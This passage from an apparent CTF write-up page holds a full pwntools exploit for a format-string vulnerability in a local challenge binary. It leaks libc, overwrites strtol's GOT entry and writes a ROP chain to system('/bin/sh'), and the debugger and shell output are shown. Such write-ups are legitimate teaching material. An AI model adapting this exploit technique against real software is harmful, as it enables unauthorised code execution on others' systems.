+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chall"</span><span class="p">,</span><span class="s"> "b *main+300</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)
+
+</span><span class="o">def </span><span class="na">write</span><span class="p">(</span><span class="am">what</span><span class="p">,</span><span class="am"> where</span><span class="p">):
+    ...................
+
+payload</span><span class="o"> =</span><span class="no"> b</span><span class="s">"%11$s..."</span><span class="o"> +</span><span class="p"> p64(</span><span class="mi">0x404030</span><span class="p">)</span><span class="c1"> # strtol@got</span><span class="p">
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)
+
+libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">-</span><span class="mi"> 0x474e0</span><span class="p">  
+write(libc_base</span><span class="o"> +</span><span class="mi"> 0x044b70</span><span class="p">,</span><span class="mi"> 0x404030</span><span class="p">)</span><span class="c1"> # strtol@got = getenv@glibc</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"%65$p"</span><span class="p">)
+leak</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)
+
+log.info(</span><span class="no">f</span><span class="s">"Stack leak:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(leak)}</span><span class="s">"</span><span class="p">)
+
+write(libc_base </span><span class="o">+ </span><span class="mi">0x0474e0</span><span class="p">,</span><span class="mi"> 0x404030</span><span class="p">)</span><span class="c1"> # strtol@got = strtol@glibc</span><span class="p">
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"%58$p"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 1272760
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chall']  
+[</span><span class="az">*</span><span class="p">] Stack leak: 0x7ffc5b8e4218
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x00000000004014a6 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()  
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rsp
+</span><span class="az">$1</span><span class="p"> = 0x7ffc5b8e4108
+</span><span class="ro">pwndbg></span><span class="p"> p/x 0x7ffc5b8e4218 - 0x7ffc5b8e4108
+</span><span class="az">$2</span><span class="p"> = 0x110
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, p64, u64
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./chall"</span><span class="p">)
+
+</span><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="am">what</span><span class="p">,</span><span class="am"> where</span><span class="p">):
+    payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+
+    array</span><span class="o"> =</span><span class="p"> []
+
+    </span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">8</span><span class="p">):
+        array.append((where</span><span class="o"> +</span><span class="p"> i, what</span><span class="o"> &</span><span class="mi"> 0xff</span><span class="p">))
+        what</span><span class="o"> >>= </span><span class="mi">8</span><span class="p">
+
+    array</span><span class="o"> =</span><span class="no"> sorted</span><span class="p">(array, </span><span class="am">key</span><span class="o">=lambda</span><span class="am"> x</span><span class="p">: x[</span><span class="mi">1</span><span class="p">])
+
+    written </span><span class="o">= </span><span class="mi">0</span><span class="p">
+    i</span><span class="o"> =</span><span class="mi"> 49</span><span class="p">
+
+    </span><span class="o">for</span><span class="p"> address, value</span><span class="o"> in</span><span class="p"> array:
+        payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (value </span><span class="o">- </span><span class="p">written)
+        payload</span><span class="o"> +=</span><span class="no"> f</span><span class="s">"%</span><span class="p">{i}</span><span class="s">$hhn"</span><span class="p">.encode()
+
+        written </span><span class="o">= </span><span class="p">value
+        i</span><span class="o"> +=</span><span class="mi"> 1</span><span class="p">
+
+    payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (</span><span class="mi">312</span><span class="o"> -</span><span class="no"> len</span><span class="p">(payload))
+
+    </span><span class="o">for</span><span class="p"> address, value </span><span class="o">in</span><span class="p"> array:
+        payload </span><span class="o">+= </span><span class="p">p64(address)
+
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)
+
+payload</span><span class="o"> =</span><span class="no"> b</span><span class="s">"%11$s..."</span><span class="o"> +</span><span class="p"> p64(</span><span class="mi">0x404030</span><span class="p">)</span><span class="c1"> # strtol@got</span><span class="p">
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)
+
+libc_base </span><span class="o">= </span><span class="p">u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">-</span><span class="mi"> 0x474e0</span><span class="p">  
+write(libc_base</span><span class="o"> +</span><span class="mi"> 0x044b70</span><span class="p">,</span><span class="mi"> 0x404030</span><span class="p">)</span><span class="c1"> # strtol@got = getenv@glibc</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"%65$p"</span><span class="p">)
+rsp</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x110</span><span class="p">
+
+write(libc_base</span><span class="o"> +</span><span class="mi"> 0x02a3e5</span><span class="p">, rsp</span><span class="o"> +</span><span class="mi"> 0</span><span class="p">)</span><span class="c1">  # pop rdi; ret;</span><span class="p">
+write(libc_base</span><span class="o"> +</span><span class="mi"> 0x1d8678</span><span class="p">, rsp</span><span class="o"> +</span><span class="mi"> 8</span><span class="p">)</span><span class="c1">  # "/bin/sh"</span><span class="p">
+write(libc_base</span><span class="o"> +</span><span class="mi"> 0x029139</span><span class="p">, rsp</span><span class="o"> +</span><span class="mi"> 16</span><span class="p">)</span><span class="c1"> # ret;</span><span class="p">
+write(libc_base</span><span class="o"> +</span><span class="mi"> 0x050d70</span><span class="p">, rsp</span><span class="o"> +</span><span class="mi"> 24</span><span class="p">)</span><span class="c1"> # system()</span><span class="p">
+
+write(libc_base</span><span class="o"> +</span><span class="mi"> 0x0474e0</span><span class="p">, </span><span class="mi">0x404030</span><span class="p">)</span><span class="c1"> # strtol@got = strtol@glibc</span><span class="p">
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"%58$p"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './chall': pid 1283781  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$ </span><span class="p">id
+uid=1000(user) gid=1000(user) groups=1000(user)
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
